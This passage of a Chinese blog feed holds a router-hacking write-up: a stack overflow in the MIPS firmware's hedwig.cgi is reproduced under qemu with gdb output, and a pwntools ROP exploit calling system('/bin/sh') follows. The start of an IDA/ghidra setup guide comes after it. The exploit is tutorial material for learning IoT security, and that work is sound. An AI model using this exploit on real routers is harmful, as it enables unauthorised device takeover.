sprintf(char * __s, char * _<br><br></code></pre></td></tr></table></figure><p>推测可能就是因为sprintf函数导致最终的栈溢出,下面我们对猜测进行验证</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo chroot . ./qemu-mipsel-static -E <span class="hljs-attribute">CONTENT_LENGTH</span>=20 -E <span class="hljs-attribute">CONTENT_TYPE</span>=<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span> -E <span class="hljs-attribute">REQUEST_METHOD</span>=<span class="hljs-string">&quot;POST&quot;</span> -E <span class="hljs-attribute">HTTP_COOKIE</span>=`python -c <span class="hljs-string">&quot;print &#x27;uid=123&#x27;+&#x27;A&#x27;*0x600&quot;</span>` -E <span class="hljs-attribute">REQUEST_URI</span>=<span class="hljs-string">&quot;/hedwig.cgi&quot;</span> -E <span class="hljs-attribute">REMOTE_ADDR</span>=<span class="hljs-string">&quot;0.0.0.0&quot;</span> -g 23946 ./htdocs/web/hedwig.cgi<br></code></pre></td></tr></table></figure><p>然后我们还是用gdb attach上</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; target remote localhost:<span class="hljs-number">23946</span><br>Remote debugging using localhost:<span class="hljs-number">23946</span><br><span class="hljs-number">0x767e9a00</span> <span class="hljs-keyword">in</span> ?? ()<br><span class="hljs-symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA<br>─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────<br> V0   <span class="hljs-number">0x0</span><br> V1   <span class="hljs-number">0x0</span><br> A0   <span class="hljs-number">0x0</span><br> A1   <span class="hljs-number">0x0</span><br> A2   <span class="hljs-number">0x0</span><br> A3   <span class="hljs-number">0x0</span><br> T0   <span class="hljs-number">0x0</span><br> T1   <span class="hljs-number">0x0</span><br> T2   <span class="hljs-number">0x0</span><br> T3   <span class="hljs-number">0x0</span><br> T4   <span class="hljs-number">0x0</span><br> T5   <span class="hljs-number">0x0</span><br> T6   <span class="hljs-number">0x0</span><br> T7   <span class="hljs-number">0x0</span><br> T8   <span class="hljs-number">0x0</span><br> T9   <span class="hljs-number">0x0</span><br> S0   <span class="hljs-number">0x0</span><br> S1   <span class="hljs-number">0x0</span><br> S2   <span class="hljs-number">0x0</span><br> S3   <span class="hljs-number">0x0</span><br> S4   <span class="hljs-number">0x0</span><br> S5   <span class="hljs-number">0x0</span><br> S6   <span class="hljs-number">0x0</span><br> S7   <span class="hljs-number">0x0</span><br> S8   <span class="hljs-number">0x0</span><br> FP   <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">SP</span>   <span class="hljs-number">0x76ffea50</span> ◂— <span class="hljs-number">0x1</span><br> PC   <span class="hljs-number">0x767e9a00</span> ◂— move   $t9, $ra /* <span class="hljs-number">0x3e0c821</span> */<br>───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────<br> ► <span class="hljs-number">0x767e9a00</span>    move   $t9, $ra<br>   <span class="hljs-number">0x767e9a04</span>    bal    <span class="hljs-number">0x767e9a0c</span><br>   <span class="hljs-number">0x767e9a08</span>    <span class="hljs-keyword">nop</span>    <br>   <span class="hljs-number">0x767e9a0c</span>    lui    $gp, <span class="hljs-number">2</span><br>   <span class="hljs-number">0x767e9a10</span>    addiu  $gp, $gp, -<span class="hljs-number">0x39fc</span><br>   <span class="hljs-number">0x767e9a14</span>    addu   $gp, $gp, $ra<br>   <span class="hljs-number">0x767e9a18</span>    move   $ra, $t9<br>   <span class="hljs-number">0x767e9a1c</span>    lw     $a0, -<span class="hljs-number">0x7fe8</span>($gp)<br>   <span class="hljs-number">0x767e9a20</span>    sw     $a0, -<span class="hljs-number">0x7ff0</span>($gp)<br>   <span class="hljs-number">0x767e9a24</span>    move   $a0, $<span class="hljs-built_in">sp</span><br>   <span class="hljs-number">0x767e9a28</span>    addiu  $<span class="hljs-built_in">sp</span>, $<span class="hljs-built_in">sp</span>, -<span class="hljs-number">0x10</span><br>───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ <span class="hljs-built_in">sp</span>  <span class="hljs-number">0x76ffea50</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│     <span class="hljs-number">0x76ffea54</span> —▸ <span class="hljs-number">0x76ffeb53</span> ◂— <span class="hljs-string">&#x27;./htdocs/web/hedwig.cgi&#x27;</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│     <span class="hljs-number">0x76ffea58</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">03</span>:000c│     <span class="hljs-number">0x76ffea5c</span> —▸ <span class="hljs-number">0x76ffeb6b</span> ◂— <span class="hljs-string">&#x27;REMOTE_ADDR=0.0.0.0&#x27;</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│     <span class="hljs-number">0x76ffea60</span> —▸ <span class="hljs-number">0x76ffeb7f</span> ◂— <span class="hljs-string">&#x27;REQUEST_URI=/hedwig.cgi&#x27;</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│     <span class="hljs-number">0x76ffea64</span> —▸ <span class="hljs-number">0x76ffeb97</span> ◂— <span class="hljs-number">0x50545448</span> (<span class="hljs-string">&#x27;HTTP&#x27;</span>)<br><span class="hljs-number">06</span>:<span class="hljs-number">0018</span>│     <span class="hljs-number">0x76ffea68</span> —▸ <span class="hljs-number">0x76fff1ab</span> ◂— <span class="hljs-string">&#x27;REQUEST_METHOD=POST&#x27;</span><br><span class="hljs-number">07</span>:001c│     <span class="hljs-number">0x76ffea6c</span> —▸ <span class="hljs-number">0x76fff1bf</span> ◂— <span class="hljs-string">&#x27;CONTENT_TYPE=application/x-www-form-urlencoded&#x27;</span><br>─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span> 767e9a00<br></code></pre></td></tr></table></figure><p>然后让程序继续运行,此时报错</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; c<br>Continuing.<br><br>Program received signal SIGSEGV, Segmentation fault.<br><span class="hljs-number">0x41414141</span> in ?? ()<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────<br> V0   <span class="hljs-number">0</span>xffffffff<br> V1   <span class="hljs-number">0</span>x4b<br> A0   <span class="hljs-number">0</span>x76ffe480 —▸ <span class="hljs-number">0</span>x767ae4e0 ◂— <span class="hljs-number">0</span>x0<br> A1   <span class="hljs-number">0</span>x1<br> A2   <span class="hljs-number">0x42e000</span> ◂— <span class="hljs-number">0</span>x0<br> A3   <span class="hljs-number">0</span>x20<br> T0   <span class="hljs-number">0</span>x767ab4c8 ◂— <span class="hljs-number">0</span>x4b /* &#x27;K&#x27; */<br> T1   <span class="hljs-number">0</span>x1309<br> T2   <span class="hljs-number">0</span>x2<br> T3   <span class="hljs-number">0</span>x24<br> T4   <span class="hljs-number">0</span>x25<br> T5   <span class="hljs-number">0</span>x807<br> T6   <span class="hljs-number">0</span>x800<br> T7   <span class="hljs-number">0</span>x400<br> T8   <span class="hljs-number">0</span>x8<br> T9   <span class="hljs-number">0</span>x0<br> S0   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> S1   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> S2   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> S3   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> S4   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> S5   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> S6   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> S7   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> S8   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> FP   <span class="hljs-number">0</span>x76ffe980 ◂— <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> SP   <span class="hljs-number">0</span>x76ffe980 ◂— <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br> PC   <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br>───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────<br>Invalid address <span class="hljs-number">0x41414141</span><br>───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ fp sp  <span class="hljs-number">0</span>x76ffe980 ◂— <span class="hljs-number">0x41414141</span> (&#x27;<span class="hljs-keyword">AAAA</span>&#x27;)<br>... ↓<br>─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────<br> ► f <span class="hljs-number">0 41414141</span><br>────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>Program received signal SIGSEGV<br>pwndbg&gt; <br></code></pre></td></tr></table></figure><p>好了,栈溢出实锤了,之后我们改一下运行脚本,测试一下偏移</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyclic</span> <span class="hljs-number">600</span><br></code></pre></td></tr></table></figure><p>改一下程序运行脚本之后发现程序回显为:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">hedwig</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>FAILED<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>unable to open temp file.<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hedwig</span>&gt;</span>%  </span><br></code></pre></td></tr></table></figure><p>无法打开某tmp文件,但是程序在之前是直接溢出的,那么我们先改大输入流</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; cyclic <span class="hljs-number">1536</span><br></code></pre></td></tr></table></figure><p>将运行命令改为:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo chroot . ./qemu-mipsel-static -E <span class="hljs-attribute">CONTENT_LENGTH</span>=20 -E <span class="hljs-attribute">CONTENT_TYPE</span>=<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span> -E <span class="hljs-attribute">REQUEST_METHOD</span>=<span class="hljs-string">&quot;POST&quot;</span> -E <span class="hljs-attribute">HTTP_COOKIE</span>=`python -c <span class="hljs-string">&quot;print &#x27;uid=123&#x27;+&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaap&#x27;&quot;</span>` -E <span class="hljs-attribute">REQUEST_URI</span>=<span class="hljs-string">&quot;/hedwig.cgi&quot;</span> -E <span class="hljs-attribute">REMOTE_ADDR</span>=<span class="hljs-string">&quot;0.0.0.0&quot;</span> -g 23946 ./htdocs/web/hedwig.cgi<br></code></pre></td></tr></table></figure><p>成功栈溢出</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; c<br>Continuing.<br><br>Program received signal SIGSEGV, Segmentation fault.<br><span class="hljs-number">0x6b61616b</span> <span class="hljs-keyword">in</span> ?? ()<br><span class="hljs-symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA<br>─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────<br> V0   <span class="hljs-number">0xffffffff</span><br> V1   <span class="hljs-number">0x4b</span><br> A0   <span class="hljs-number">0x76ffe480</span> —▸ <span class="hljs-number">0x767ae4e0</span> ◂— <span class="hljs-number">0x0</span><br> A1   <span class="hljs-number">0x1</span><br> A2   <span class="hljs-number">0x42e000</span> ◂— <span class="hljs-number">0x0</span><br> A3   <span class="hljs-number">0x20</span><br> T0   <span class="hljs-number">0x767ab4c8</span> ◂— <span class="hljs-number">0x4b</span> /* <span class="hljs-string">&#x27;K&#x27;</span> */<br> T1   <span class="hljs-number">0x1309</span><br> T2   <span class="hljs-number">0x2</span><br> T3   <span class="hljs-number">0x24</span><br> T4   <span class="hljs-number">0x25</span><br> T5   <span class="hljs-number">0x807</span><br> T6   <span class="hljs-number">0x800</span><br> T7   <span class="hljs-number">0x400</span><br> T8   <span class="hljs-number">0x8</span><br> T9   <span class="hljs-number">0x0</span><br> S0   <span class="hljs-number">0x6b616162</span> (<span class="hljs-string">&#x27;baak&#x27;</span>)<br> S1   <span class="hljs-number">0x6b616163</span> (<span class="hljs-string">&#x27;caak&#x27;</span>)<br> S2   <span class="hljs-number">0x6b616164</span> (<span class="hljs-string">&#x27;daak&#x27;</span>)<br> S3   <span class="hljs-number">0x6b616165</span> (<span class="hljs-string">&#x27;eaak&#x27;</span>)<br> S4   <span class="hljs-number">0x6b616166</span> (<span class="hljs-string">&#x27;faak&#x27;</span>)<br> S5   <span class="hljs-number">0x6b616167</span> (<span class="hljs-string">&#x27;gaak&#x27;</span>)<br> S6   <span class="hljs-number">0x6b616168</span> (<span class="hljs-string">&#x27;haak&#x27;</span>)<br> S7   <span class="hljs-number">0x6b616169</span> (<span class="hljs-string">&#x27;iaak&#x27;</span>)<br> S8   <span class="hljs-number">0x6b61616a</span> (<span class="hljs-string">&#x27;jaak&#x27;</span>)<br> FP   <span class="hljs-number">0x76ffe980</span> ◂— <span class="hljs-number">0x6b61616c</span> (<span class="hljs-string">&#x27;laak&#x27;</span>)<br> <span class="hljs-built_in">SP</span>   <span class="hljs-number">0x76ffe980</span> ◂— <span class="hljs-number">0x6b61616c</span> (<span class="hljs-string">&#x27;laak&#x27;</span>)<br> PC   <span class="hljs-number">0x6b61616b</span> (<span class="hljs-string">&#x27;kaak&#x27;</span>)<br>───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────<br>Invalid address <span class="hljs-number">0x6b61616b</span><br>───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ fp <span class="hljs-built_in">sp</span>  <span class="hljs-number">0x76ffe980</span> ◂— <span class="hljs-number">0x6b61616c</span> (<span class="hljs-string">&#x27;laak&#x27;</span>)<br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│        <span class="hljs-number">0x76ffe984</span> ◂— <span class="hljs-number">0x6b61616d</span> (<span class="hljs-string">&#x27;maak&#x27;</span>)<br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│        <span class="hljs-number">0x76ffe988</span> ◂— <span class="hljs-number">0x6b61616e</span> (<span class="hljs-string">&#x27;naak&#x27;</span>)<br><span class="hljs-number">03</span>:000c│        <span class="hljs-number">0x76ffe98c</span> ◂— <span class="hljs-number">0x6b61616f</span> (<span class="hljs-string">&#x27;oaak&#x27;</span>)<br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│        <span class="hljs-number">0x76ffe990</span> ◂— <span class="hljs-number">0x6b616170</span> (<span class="hljs-string">&#x27;paak&#x27;</span>)<br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│        <span class="hljs-number">0x76ffe994</span> ◂— <span class="hljs-number">0x6b616171</span> (<span class="hljs-string">&#x27;qaak&#x27;</span>)<br><span class="hljs-number">06</span>:<span class="hljs-number">0018</span>│        <span class="hljs-number">0x76ffe998</span> ◂— <span class="hljs-number">0x6b616172</span> (<span class="hljs-string">&#x27;raak&#x27;</span>)<br><span class="hljs-number">07</span>:001c│        <span class="hljs-number">0x76ffe99c</span> ◂— <span class="hljs-number">0x6b616173</span> (<span class="hljs-string">&#x27;saak&#x27;</span>)<br>─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span> 6b61616b<br>────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>Program received signal SIGSEGV<br></code></pre></td></tr></table></figure><p>此时查一下偏移量</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; cyclic -l <span class="hljs-number">0</span>x6b61616b<br><span class="hljs-attribute">1040</span><br></code></pre></td></tr></table></figure><p>好的,现在我们有了偏移量,下面就可以开始构造payload了<br>在日常的栈溢出中,我们的目标是esp指针,但是在mips架构下,我们的目标就变成了$ra,因为是路由器,所以一般没有aslr,我们只需要找到基址,然后直接调用system函数即可,</p><p>这里提一个小trick, 在我们想写入的地址有坏字节时,可以通过先-1写入,后面依靠其他gadget来将地址加一来完成构造(比如本例中system函数是在0x53200,我们先存入减一的值,再后面再利用gadget来加一恢复</p><p>exp如下:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-built_in">from</span> pwn import *<br>context.endian=<span class="hljs-string">&quot;little&quot;</span><br>context.arch=<span class="hljs-string">&quot;mips&quot;</span><br>system_addr = <span class="hljs-number">0x53200</span><span class="hljs-number">-1</span>+<span class="hljs-number">0x767e9000</span><br>add_jar = <span class="hljs-number">0x159CC</span> <span class="hljs-comment"># addiu $s5,$sp,0x170+var_160 | jalr $s0 |</span><br>sys_1 = <span class="hljs-number">0x000158C8</span> <span class="hljs-comment"># addiu $s0,1 | jalr $s5 |</span><br>padding = <span class="hljs-string">&#x27;uid=&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">1013</span><br>padding += p32(base_addr + system_addr_1)       <br>padding += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">16</span><br>padding += p32(base_addr+add_jar)               <br>padding += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">12</span> <br>padding += p32(base_addr + sys_1)       <br>padding += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span><br>padding += <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.<span class="hljs-built_in">write</span>(padding)<br>f.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><p>文章首发先知社区,转载请标明出处<br><a href="https://xz.aliyun.com/t/6808">https://xz.aliyun.com/t/6808</a><br>enjoy:)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>路由器破解初探之环境搭建</title>
    <link href="/2019/11/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/11/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>最近在学习iot安全,路由器的破解应该是入门点,而在路由器的漏洞挖掘过程中,环境搭建是一个坑点巨多的点,毕竟,贫穷使我选择仿真,本文记录一些我踩过的坑,希望能对想入坑的人提供一些帮助</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>注:我的安装环境是ubuntu 16.04(本来选择18.04的,结果18.04会有玄学问题2333</strong></p><h3 id="在linux下安装IDA"><a href="#在linux下安装IDA" class="headerlink" title="在linux下安装IDA"></a>在linux下安装IDA</h3><p>如何在ubuntu下安装IDA呢?<br>其实也不是很难,我这里直接采用wine模拟器来安装运行IDA</p><p>建议运行环境(ubuntu16.04,可支持IDA7.0,但是最好使用IDA6.8,可以使用更多的插件)</p><p>安装命令如下:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install wine<br></code></pre></td></tr></table></figure><p>安装wine后可以直接按安装IDA或者将物理机的IDA拉近虚拟机中即可<br>然后为了方便可以写一个启动脚本</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!bin/sh</span><br>wine pwd/idag.exe<br></code></pre></td></tr></table></figure><p>当然,由于某些DLL文件的缺失可能会导致无法成功安装或启动,我们可以通过将本机的DLL文件放入IDA的根目录下来解决该问题,还有一些运行的报错可以通过错误信息来依次解决,因为原因可能有很多,这里就不再阐述</p><h3 id="安装IDA的MIPS插件和脚本"><a href="#安装IDA的MIPS插件和脚本" class="headerlink" title="安装IDA的MIPS插件和脚本"></a>安装IDA的MIPS插件和脚本</h3><ol><li>下载插件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/devttys0/ida.git<br></code></pre></td></tr></table></figure><ol start="2"><li>复制脚本<br>我们需要将plugins下的所有的python文件都复制到IDA的相同目录中,还需要把scripts也复制过去<br>第一步的命令大概如下:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> -r `find <span class="hljs-built_in">pwd</span>/plugins -iname *.py` <span class="hljs-built_in">pwd</span>/plugins/<br></code></pre></td></tr></table></figure><h3 id="ghidra"><a href="#ghidra" class="headerlink" title="ghidra"></a>ghidra</h3><p>在反编译过程中,有时候IDA会有一些玄学问题,这里使用ghidra就可能会舒服很多,虽然爆出了很多后门,但是插件的数量以及在一些方面的优势还是不可小视的<br>下载地址</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//ghidra-sre<span class="hljs-meta">.org</span>/<br></code></pre></td></tr></table></figure><p>这里也提供一个9.1版本的<a href="https://pan.baidu.com/s/1zHWilk5NiTuzDItQhI8nnQ">百度云链接</a>吧,提取码：8upz </p><p>启动环境需要</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">4</span> GB RAM<br><span class="hljs-number">1</span> GB storage (for <span class="hljs-keyword">installed </span>Ghidra <span class="hljs-keyword">binaries)</span><br><span class="hljs-keyword"></span>Dual monitors strongly suggested<br></code></pre></td></tr></table></figure><p>以及</p><figure class="highlight apache"><table><tr><td 